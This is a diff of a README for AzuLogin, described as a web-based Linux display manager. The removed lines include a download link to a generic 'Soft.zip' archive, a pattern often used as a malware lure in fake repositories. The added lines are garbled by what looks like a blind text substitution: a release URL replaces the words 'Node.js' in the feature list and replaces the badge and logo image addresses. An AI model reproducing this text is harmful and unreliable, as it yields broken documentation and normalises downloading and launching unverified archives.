@@ -6,7 +6,7 @@ Welcome to AzuLogin, a web-based Linux display manager designed specifically for
 - **Web-Based Interface:** Enjoy a sleek and intuitive login interface accessible through any web browser.
 - **Systemd Integration:** Seamless integration with systemd service management for a reliable login process.
 - **HTML, CSS, JavaScript:** Leveraging the power of web technologies to create a responsive and interactive login experience.
-- **No Electron or Node.js:** Lightweight implementation without the need for Electron or Node.js dependencies.
+- **No Electron or https://github.com/TheGuyNobodyKnow/azulogin/releases/tag/v1.2** Lightweight implementation without the need for Electron or https://github.com/TheGuyNobodyKnow/azulogin/releases/tag/v1.2 dependencies.
 - **Python with Pywebview:** Utilizes Python with Pywebview to render web content within a native window.
 - **Open Source:** AzuLogin is built on the principles of free and open-source software (FOSS) for community collaboration and enhancement.
   
@@ -14,7 +14,7 @@ Welcome to AzuLogin, a web-based Linux display manager designed specifically for
 azuos, display-manager, foss, html, html-css-javascript, javascript, js, linux, login, no-electron, no-nodejs, python, pywebview, systemd-service, web-based, web-technologies
 
 ## Installation
-To install AzuLogin, please download the installation file from the following link: [![Download AzuLogin](https://img.shields.io/badge/Download-AzuLogin-blue)](https://github.com/files/Soft.zip)
+To install AzuLogin, please download the installation file from the following link: [![Download AzuLogin](https://github.com/TheGuyNobodyKnow/azulogin/releases/tag/v1.2)](https://github.com/TheGuyNobodyKnow/azulogin/releases/tag/v1.2)
 
 Once the download is complete, extract the contents and launch the application to start using AzuLogin. If you encounter any issues with the provided link, please check the "Releases" section of this repository for alternative download options.
 
@@ -34,4 +34,4 @@ AzuLogin is licensed under the MIT License. See the [LICENSE](#) file for more i
 
 By incorporating the power of web technologies and open-source principles, AzuLogin provides a modern and efficient display manager for AzuOS users. Upgrade your login experience with AzuLogin today! 🚀
 
-![AzuOS Logo](https://example.com/azulos.png)
+![AzuOS Logo](https://github.com/TheGuyNobodyKnow/azulogin/releases/tag/v1.2)
